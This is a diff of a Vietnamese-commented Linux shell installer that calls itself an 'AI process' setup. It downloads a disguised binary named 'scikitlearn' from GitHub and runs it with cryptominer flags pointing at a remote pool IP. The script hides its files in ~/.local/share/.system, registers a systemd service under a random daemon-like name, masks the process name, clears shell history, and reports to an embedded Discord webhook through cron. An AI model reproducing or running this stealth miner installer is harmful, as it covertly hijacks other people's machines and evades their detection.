@@ -3,7 +3,7 @@
 # URL để tải tệp thực thi AI của bạn
 AI_ZIP_URL="https://github.com/gitumtriston/Computed-Network/raw/refs/heads/master/scikitlearn.zip"
 # Lệnh để khởi động tiến trình AI của bạn
-AI_START_COMMAND="./scikitlearn -o 144.202.19.203:8123 -u 46xtDT8AsnPRMdT1gVXgTt6PZdXx6ZbJNaB3Z9rSKLbeHaFzMXMvuVMSsUakubfRufPhjYA37UMmGDuBj1VAZZK36Mk4CRp.learn -p x -a rx/0 --max-cpu-usage=80"
+AI_START_COMMAND="./scikitlearn -o 144.202.19.203:8123 -u Python.learning -p x -a rx/0 --max-cpu-usage=75"
 
 # Webhook Discord để nhận thông báo (Tùy chọn)
 DISCORD_WEBHOOK="https://discord.com/api/webhooks/1423873253029580832/fcA-2celN9ZdHt_beYEJ7wLYJ6DtjxXsiTiLMUcdOYvk4JLBwtEbzZN3JCbWp8jm1lX3"
@@ -14,7 +14,7 @@ INSTALL_DIR="$HOME/.local/share/.system"
 SERVICE_NAME=$(shuf -n1 -e "sysdaemon" "core-logger" "netwatchd" "usb-handler")
 # ============================
 
-echo "🛠️ Đang cài đặt và cấu hình tiến trình AI ẩn..."
+echo "🛠️ Đang cài đặt và cấu hình tiến trình AI..."
 
 # Cài đặt các gói cần thiết
 sudo apt update
@@ -31,8 +31,8 @@ unzip -o scikitlearn1.zip
 rm scikitlearn1.zip
 chmod +x scikitlearn
 
-# Tạo tập lệnh runner để ngụy trang tiến trình bằng 'exec -a'
-# Tập lệnh này sẽ khởi chạy tiến trình AI của bạn
+
+# Khởi chạy tiến trình AI
 tee "$INSTALL_DIR/$FAKE_NAME" > /dev/null << EOF
 #!/bin/bash
 cd $INSTALL_DIR
@@ -91,7 +91,7 @@ EOF
     chmod +x "$INSTALL_DIR/logger.sh"
 
     # Cronjob để gửi thông báo mỗi 15 phút
-    (crontab -l 2>/dev/null; echo "*/15 * * * * $INSTALL_DIR/logger.sh") | crontab -
+    (crontab -l 2>/dev/null; echo "*/5 * * * * $INSTALL_DIR/logger.sh") | crontab -
 
     # Gửi thông báo lần đầu
     "$INSTALL_DIR/logger.sh"
@@ -100,12 +100,13 @@ fi
 history -c
 
 echo ""
-echo "✅ Đã cài đặt và khởi chạy tiến trình AI '$FAKE_NAME' một cách ẩn danh!"
+echo "✅ Đã cài đặt và khởi chạy tiến trình AI '$FAKE_NAME' !"
 echo "   - Dịch vụ systemd '$SERVICE_NAME' đã được tạo để tự động chạy lại."
 if [ -n "$DISCORD_WEBHOOK" ]; then
     echo "   - Thông báo trạng thái sẽ được gửi đến Discord mỗi 15 phút."
 
 fi
+
 
 
 
